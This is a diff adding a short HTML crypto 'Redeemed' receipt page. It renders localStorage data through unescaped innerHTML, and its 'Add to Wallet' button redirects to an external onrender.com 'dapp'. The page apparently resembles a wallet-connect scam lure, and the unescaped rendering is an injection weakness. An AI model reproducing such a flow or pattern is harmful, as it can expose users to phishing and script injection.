@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Receipt</title>
+<style>
+body{background:#020b20;color:#fff;font-family:Arial}
+.box{max-width:420px;margin:40px auto;background:#0f1c3f;padding:20px}
+button{width:100%;padding:12px;background:#00ffcc;border:none}
+</style>
+</head>
+<body>
+<div class="box" id="r"></div>
+<script>
+const d = JSON.parse(localStorage.getItem("receipt"));
+r.innerHTML = `
+<h2>✅ Redeemed</h2>
+Code: ${d.code}<br>
+Amount: ${d.amount} ${d.crypto}<br><br>
+<button onclick="openDapp()">Add to Wallet</button>`;
+function openDapp(){
+ location.href="https://cryptopay-x26h.onrender.com";
+}
+</script>
+</body>
+</html>
